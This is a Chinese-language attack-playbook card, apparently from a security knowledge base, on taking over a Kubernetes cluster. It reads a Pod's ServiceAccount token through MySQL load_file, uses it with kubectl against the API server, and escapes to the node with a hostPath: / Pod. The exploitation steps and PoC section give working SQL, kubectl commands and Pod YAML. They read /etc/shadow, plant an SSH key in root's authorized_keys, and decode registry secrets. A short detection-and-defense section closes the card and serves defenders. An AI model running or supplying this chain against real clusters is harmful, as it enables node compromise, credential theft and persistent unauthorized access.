---
id: cloud-k8s-mysql-loadfile-sa-token-kubectl-hostpath-escape
title: 从 MySQL load_file 读取 Pod 内 ServiceAccount Token，直接 kubectl 接管集群并用 hostPath Pod 逃逸
type: scenario
domain: cloud
path: cloud/k8s
technique: mysql-loadfile-sa-token-kubectl-hostpath-escape
tags:
- kubernetes
- serviceaccount
- token
- mysql
- load_file
- kubectl
- hostpath
- escape
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:13:24+08:00'
  notes: 已对照原文核对（load_file 读 SA token、kubectl --token 打 6443、uncordon master、带 master 容忍的 hostPath:/ Pod、nodeSelector node2 均一致）；本次核对未读取图片，仅依据正文；token 实际权限以原环境为准未复现
url: /docs/cloud/k8s/cloud-k8s-mysql-loadfile-sa-token-kubectl-hostpath-escape/
draft: false
kb_aliases:
- load_file 读 serviceaccount token
- MySQL 读 k8s token 接管集群
- kubectl --token 未授权 6443
- 无 kubeconfig 用 SA token 接管
- hostPath 挂载根目录逃逸
---

## 一句话结论

业务 MySQL 与业务 Pod 同处 Kubernetes 时，若已拿到 MySQL root（例如 Web RCE 后从配置文件取得库口令），可用 `select load_file('/var/run/secrets/kubernetes.io/serviceaccount/token')` 读出该 Pod 的 ServiceAccount Token；这个 JWT 可直接作为 `kubectl --token=...` 的凭据访问 6443 API Server，随后创建挂载 `hostPath: /` 的 Pod 即读写节点宿主机文件系统。

## 原理

- Kubernetes 默认把 ServiceAccount Token 以文件形式投影到每个 Pod 的 `/var/run/secrets/kubernetes.io/serviceaccount/token`；任何能读这个文件的进程就持有该 ServiceAccount 的身份。
- Token 是标准 JWT，API Server 只认签名与 RBAC，不关心调用方是不是 Pod 内的进程——所以从 Pod 里把 token 拿出来，可以在任意能访问 6443 的机器上 `kubectl`。
- MySQL 的 `load_file()` 以 mysqld 进程权限读文件；当 mysqld 本身就跑在业务 Pod 里时，读的就是该 Pod 的 token。配合 `secure_file_priv` 为空（容器镜像里常为默认空）即可读出。
- 拿到 token 后能做什么取决于绑定到该 ServiceAccount 的 ClusterRole。原文环境给了足够权限：`kubectl describe nodes`、`uncordon`、创建 Pod，说明该 SA（或它所属组）有 node 与 pod 的写权限。
- 最后一步是经典的配置型逃逸：`hostPath: /` 挂到 Pod 的 `/tmp`，Pod 内即可读写节点根文件系统——写 `/tmp/etc/cron.d/`、写 `authorized_keys`、改 `kubelet` 配置，都是节点 root 效果。对 master 节点还需要容忍 `node-role.kubernetes.io/master:NoSchedule` 污点，否则 Pod 调度不上去。

## 触发条件

- 已获得 MySQL root 或等价的高权限（能执行 `load_file`，且 `secure_file_priv` 允许）。
- mysqld 运行在 Kubernetes Pod 内，且该 Pod 挂载了默认 ServiceAccount Token（未设置 `automountServiceAccountToken: false`）。
- 攻击者位置能访问 API Server 6443（或 6443 通过其它端口/Ingress 暴露）。
- 该 ServiceAccount 的 RBAC 允许创建 Pod（哪怕是 `create pods` 的默认组或 chart 里过宽的 RoleBinding）。
- 目标集群允许 `hostPath` 卷（未开 PodSecurity/OPA 限制）。

## 利用步骤

1. 从业务源码/配置文件取得数据库口令（例如 CMS 的 `config.php` 里 `host/dbname/username/password`）。
2. 连库并读 token：

```sql
select load_file("/var/run/secrets/kubernetes.io/serviceaccount/token");
```

   也可顺带读 `namespace` 与 `ca.crt`。
3. 把 token 作为 Bearer 凭据直接打 API Server：

```bash
kubectl -s https://API:6443/ --insecure-skip-tls-verify=true --token=<JWT> describe nodes
kubectl --token=<JWT> -s https://API:6443/ --insecure-skip-tls-verify=true auth can-i --list
```

4. 若 master 节点被 cordon（`SchedulingDisabled`）或带污点，先解除或加容忍：

```bash
kubectl --token=<JWT> -s https://API:6443/ --insecure-skip-tls-verify=true uncordon master
```

5. 创建挂载节点根目录的 Pod（带 master 污点容忍）：

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: control-master-x
spec:
  tolerations:
    - key: node-role.kubernetes.io/master
      operator: Exists
      effect: NoSchedule
  containers:
    - name: control-master-x
      image: REGISTRY/public/mysql:5.6
      command: ["/bin/sleep", "3650d"]
      volumeMounts:
        - name: master
          mountPath: /tmp
  volumes:
    - name: master
      hostPath:
        path: /
        type: Directory
```

6. `kubectl exec -it control-master-x -- /bin/sh`，此时 `/tmp` 就是节点根目录：`cat /tmp/etc/shadow`、`echo <pubkey> >> /tmp/root/.ssh/authorized_keys` 后 ssh 节点。
7. 要落到指定节点时用 `nodeSelector: {kubernetes.io/hostname: node2}` 固定调度目标。

## PoC

```sql
-- 1. 读 token
select load_file("/var/run/secrets/kubernetes.io/serviceaccount/token");
```

```bash
# 2. 用 token 直连 API Server
kubectl -s https://API:6443/ --insecure-skip-tls-verify=true --token=<JWT> get nodes
# 3. 建挂根目录的 Pod（YAML 见上），exec 后：
cat /tmp/etc/shadow
echo "<ssh-rsa AAAA...>" >> /tmp/root/.ssh/authorized_keys
```

## 变体与关联

- 变体：不通过 MySQL，任何 Pod 内命令执行都能 `cat /var/run/secrets/.../token`，本卡之所以强调 `load_file`，是因为「只有 SQL 注入/数据库访问」的场景同样能拿到 token。
- 变体：token 权限不足时，可尝试 `TokenRequest` 申请更高权限 SA 的令牌（需该 SA 的 `serviceaccounts/token` 权限）。
- 变体：命中 `kubernetes.io/dockerconfigjson` 类型 Secret 时，`kubectl get secret X -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d` 直接得到镜像仓库账号口令。
- 关联：[[cloud-k8s-k8s-pod-sa-token-rbac-enumeration]]（拿到 token 后的权限枚举方法论）。
- 关联：[[cloud-k8s-kubeconfig-leak-cluster-takeover]]（凭据换成 kubeconfig 的同构链）。
- 关联：[[cloud-k8s-taint-toleration-nodeaffinity-master-escape]]（master 污点容忍的细节）。
- 关联：[[cloud-container-k8s-workload-config-escape]]（hostPath/privileged 逃逸手法汇总）。

## 检测与防御

- 防御：业务 Pod 一律 `automountServiceAccountToken: false`（除非确需 API 访问）；确需时给最小 RBAC，禁止 `create pods`、`get secrets`、`*`。
- 防御：数据库账号不给 `FILE` 权限，并设置 `secure_file_priv` 指向受限目录；业务库与集群控制面网络隔离。
- 防御：启用 PodSecurity/OPA 禁止 `hostPath`（尤其 `path: /`）、禁止特权与 `hostPID/hostNetwork`。
- 检测：API Server 审计日志里出现非 node 来源、且 UserAgent 为 `kubectl` 的 token 使用；SA token 被用于从集群外 IP 访问；出现带 `hostPath: /` 的 Pod 创建；Pod 内 mysqld 读取 `/var/run/secrets/...`。
- 响应：吊销/轮换该 ServiceAccount token（删除并重建 Pod 即换新 token）、删除恶意 Pod、清理节点 `/etc/cron.d` 与 `authorized_keys`、审计 6443 暴露面与 RBAC 过宽绑定。
